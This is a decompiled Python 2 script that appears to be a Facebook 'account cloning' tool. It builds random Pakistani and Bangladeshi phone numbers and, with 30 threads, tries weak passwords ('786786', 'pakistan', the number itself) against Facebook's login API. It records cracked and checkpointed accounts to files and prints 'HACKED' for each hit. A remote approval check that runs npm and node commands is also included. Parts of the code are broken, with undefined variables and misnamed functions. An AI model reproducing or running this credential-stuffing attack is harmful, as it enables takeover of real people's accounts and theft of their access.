# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.18 (default, Mar 20 2021, 14:59:33) 
# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/
# Embedded file name: koNtol
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
os.system('rm -rf .txt')
for n in range(1000):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()

try:
    import requests
except ImportError:
    os.system('pip2 install mechanize')

try:
    import mechanize
except ImportError:
    os.system('pip2 install request')
    time.sleep(1)
    os.system('Then type: python2 star.py')

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

#### colours ####
B='\033[1;94m'
R='\033[1;91m'
G='\033[1;92m'
W='\033[1;97m'
S='\033[1;96m'
P='\033[1;95m'
Y='\033[1;93m'



def reg():
    os.system('clear')
    print logo
    print ''
    print '\x1b[1;31;1mTake The Approval For Login'
    print ''
    time.sleep(1)
    
    try:
        to = open('/sdcard/.PA404.txt', 'r').read()
    except (KeyError, IOError):
        reg2()

    r = requests.get('https://raw.githubusercontent.com/Alex-army/Alex/main/server.txt').text
    if to in r:
        os.system('cd ..... && npm install')
        os.system('fuser -k 5000/tcp &')
        os.system('#')
        os.system('cd ..... && node index.js &')
        time.sleep(5)
        ip()
    else:
        os.system('clear')
        print logo
        print ''
        print '\tApproved Failed'
        print ''
        print ' \x1b[1;92mYour Id Is Not Approved Already '
        print ''
        print ' \x1b[1;92mCopy token id and send to XTYLISH PATHANI'
        print ''
        print ' \x1b[1;92mYour id: ' + to
        print ''
        raw_input('\x1b[1;93m Press enter to send id')
        os.system('xdg-open https://www.youtube.com/channel/UCdwF9LXC2aOnM0FXmsiGBpQ')
        reg()


def reg2():
    os.system('clear')
    print logo
    print ''
    print '\tApproval not detected'
    print ''
    print ' \x1b[1;92mCopy and press enter , And Send Me On Facebook'
    print ''
    id = uuid.uuid4().hex[:50]
    print ' Your id: ' + id
    print ''
    print ''
    raw_input(' Press enter to go to Facebook ')
    os.system('xdg-open https://www.youtube.com/channel/UCdwF9LXC2aOnM0FXmsiGBpQ')
    sav = open('/sdcard/.PA404.txt', 'w')
    sav.write(id)
    sav.close()
    raw_input('\x1b[1;92m Press enter to check Approval ')
    reg()


def ip():
    os.system('clear')
    print logo
    print ''
    print '\tCollecting device info'
    print ''
    
    try:
        ipinfo = requests.get('http://ip-api.com/json/')
        z = json.loads(ipinfo.text)
        ips = z['query']
        country = z['country']
        regi = z['regionName']
        network = z['isp']
    except:
        pass

    print '\x1b[1;93m Your ip: ' + ips
    time.sleep(2)
    print ''
    print '\x1b[1;95m Your country: ' + country
    time.sleep(2)
    print ''
    print '\x1b[1;92m Your region: ' + regi
    time.sleep(2)
    print ''
    print ' \x1b[1;97mYour network: ' + network
    time.sleep(1)
    print ''
    print ' Loading ...'
    time.sleep(1)
    log_menu()

def lisensi():
    os.system('clear')
    login()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(3.0 / 200)


def tik():
    titik = ['   ', '.  ', '.. ', '...', '.. ', '.  ', '   ']
    for o in titik:
        print '\r\x1b[1;91m     [\xe2\x97\x8f] \x1b[1;92mLoa\x1b[1;90mding \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(0.5)


back = 0
oks = []
id = []
cpb = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'
os.system('clear')
logo1 = '\n\x1b[0;31m\xe2\x8b\x9f\x1b[0;34m Cp Acountes  4 YA 7 DAYS MA ON HONGA OR KOCH CP ACOUNT JUST NOW ON HO GA ENJOY CLONING HATERS I HOPE YOU AND YOUR KHANDAN ALWAYS YATEEN .                                             \n\x1b[0;31m\xe2\x8b\x9f \x1b[0;35m(DEVOLPER BY ALEX) --------------------------------------------------\n\x1b[0;31m\xe2\x8b\x9f\x1b[0;32m AUTHOR     :\x1b[0;31m  Alex Prince Official \n\x1b[0;31m\xe2\x8b\x9f \x1b[0;32mFB GANG    :  \x1b[0;31mHittler Family \n\x1b[0;31m\xe2\x8b\x9f \x1b[0;32mWhatsap    :  \x1b[0;31m03171168085\n\x1b[1;97m--------------------------------------------------'

def login():
    os.system('clear')
    print logo1
    print
    print '\x1b[1;97m[{1}] : CLONE PAKISTAN ACCOUNT'
    print '\x1b[1;95m[{2}] : CLONE BANGLADESH ACCOUNT'
    print '\x1b[1;93m[{0}] : EXIT TOOL'
    pilih_Somi()

def pilih_Somi():
    Somi = raw_input('\n\x1b[1;95m\xe2\x80\xa2\xe2\x9e\xa2 \x1b[1;96m')
    if Somi == '':
        print '\x1b[1;97mFill In Correctly'
        pilih_login()
    elif Somi == '1':
        p()
    elif Somi == '2':
        b()


def p():
    os.system('clear')
    print logo1
    print
    print
    print 'Do you want countinue [y/n]'
    act()


def act():
    somi = raw_input('\n\n \x1b[1;97m  ')
    if somi == '':
        print '[!] Fill in correctly'
        act()
    elif somi == 'y':
        tik()
        os.system('clear')
        print logo1
        print
        print '\x1b[1;93m--------------------------------------------------'
        print '\x1b[1;93m        <<<--->>>SELECT SIM CODE<<<--->>>'
        print '\x1b[1;93m--------------------------------------------------'
        print '\x1b[1;91m<<<--->>> 00,01,02,03,04,05,06,07,08,09 <<<--->>>'
        print '\x1b[1;92m<<<------>>> 11,12,13,14,15,16,17,18 <<<------>>>'
        print '\x1b[1;92m<<<------------>>> 21,22,23,24 <<<------------>>>'
        print '\x1b[1;92m<<<-------->>> 30,31,32,33,34,35,36 <<<------->>>'
        print '\x1b[1;92m<<<--->>> 40,41,42,43,44,45,46,47,48,49 <<<--->>>'
        print '\x1b[1;97m--------------------------------------------------'
        print
        try:
            c = raw_input('<<-->>')
            k = '03'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            somi()

    elif somi == 'n':
        login()
    else:
        print '[!] Fill In Correctly'
        action()
    print 50 * '\x1b[1;93m-'
    xxx = str(len(id))
    jalan('\x1b[1;96m TOTAL IDS NUMBER : ' + '90000')
    jalan('\x1b[1;93m TO STOP THIS PROCESS PRESS Ctrl THEN z')
    print 50 * '\x1b[1;93m-'

    def main(arg):
        global cpb
        global oks
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;93m   (HACKED\x1b[1;92mAlex)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass1
                okb = open('sdcard/ids/successful.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;92m   (Checkpoint\x1b[1;97mAlex\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass1
                cps = open('sdcard/ids/checkpoint.txt', 'a')
                cps.write(k + c + user + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
            else:
                pass2 = k + c + user
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;93m   (HACKED\x1b[1;92mAlex)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass2
                    okb = open('sdcard/ids/successful.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;92m   (Checkpoint\x1b[1;97mAlex\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass2
                    cps = open('sdcard/ids/checkpoint.txt', 'a')
                    cps.write(k + c + user + pass3 + '\n')
                    cps.close()
                    cpb.append(c + user + pass3)
                else:
                    pass3 = '786786'
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;93m   (HACKED\x1b[1;92mAlex)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass3
                        okb = open('sdcard/ids/successful.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;92m   (Checkpoint\x1b[1;97mAlex\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass3
                        cps = open('sdcard/ids/checkpoint.txt', 'a')
                        cps.write(k + c + user + pass3 + '\n')
                        cps.close()
                        cpb.append(c + user + pass3)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 50 * '\x1b[1;91m-'
    print 'Process Has Been Completed ...'
    raw_input('\n\x1b[1;92m[\x1b[1;92mBack\x1b[1;95m]')
    login()


def b():
    os.system('clear')
    print logo1
    print
    print
    print 'Do you want countinue [y/n]'
    action()


def action():
    somi = raw_input('\n\n \x1b[1;97m  ')
    if somi == '':
        print '[!] Fill in correctly'
        action()
    elif somi == 'y':
        tik()
        os.system('clear')
        print logo1
        print
        try:
            c = raw_input('    <<<--->>TYPE ANY 3 DIGIT NUMBER<<<-->>> \n\n     \x1b[1;94m\x1b[1;96m\n<<<----->>> 175,165,191, 192, 193, 194,<<<---->>> \n<<<-------->>> 196, 197, 198, 199<<<---------->>> \n >>> ')
            k = '+880'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            somi()

    elif somi == 'n':
        login()
    else:
        print '[!] Fill In Correctly'
        action()
    print 47 * '\x1b[1;93m-'
    xxx = str(len(id))
    jalan('\x1b[1;96m TOTAL IDS NUMBER : ' + '1000000')
    jalan('\x1b[1;93m TO STOP THIS PROCESS PRESS Ctrl THEN z')
    print 47 * '\x1b[1;93m-'

    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;93m   (HACKED\x1b[1;92mAlex)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass1
                okb = open('sdcard/ids/successful.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;92m   (Checkpoint\x1b[1;97mAlex\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass1
                cps = open('sdcard/ids/checkpoint.txt', 'a')
                cps.write(k + c + user + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
            else:
                pass2 = '786786786'
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;93m   (HACKED\x1b[1;92mAlex)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass2
                    okb = open('sdcard/ids/successful.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;92m   (Checkpoint\x1b[1;97mAlex\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass2
                    cps = open('sdcard/ids/checkpoint.txt', 'a')
                    cps.write(k + c + user + pass3 + '\n')
                    cps.close()
                    cpb.append(c + user + pass3)
                else:
                    pass3 = '786786'
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;93m   (HACKED\x1b[1;92mAlex)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass3
                        okb = open('sdcard/ids/successful.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;92m   (Checkpoint\x1b[1;97mAlex\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass3
                        cps = open('sdcard/ids/checkpoint.txt', 'a')
                        cps.write(k + c + user + pass3 + '\n')
                        cps.close()
                        cpb.append(c + user + pass3)
                    else:
                        pass4 = 'pakistan'
                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;93m   (HACKED\x1b[1;92mAlex)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass4
                            okb = open('sdcard/ids/successful.txt', 'a')
                            okb.write(k + c + user + pass4 + '\n')
                            okb.close()
                            oks.append(c + user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;92m   (CheckPoint\x1b[1;97mAlex\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass4
                            cps = open('sdcard/ids/checkpoint.txt', 'a')
                            cps.write(k + c + user + pass4 + '\n')
                            cps.close()
                            cpb.append(c + user + pass4)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 50 * '\x1b[1;91m-'
    print 'Process Has Been Completed ...'
    print 'Total Online/Offline : ' + str(len(oks)) + '/' + str(len(cpb))
    raw_input('\n\x1b[1;92m[\x1b[1;92mBack\x1b[1;95m]')
    login()


if __name__ == '__main__':
    login()
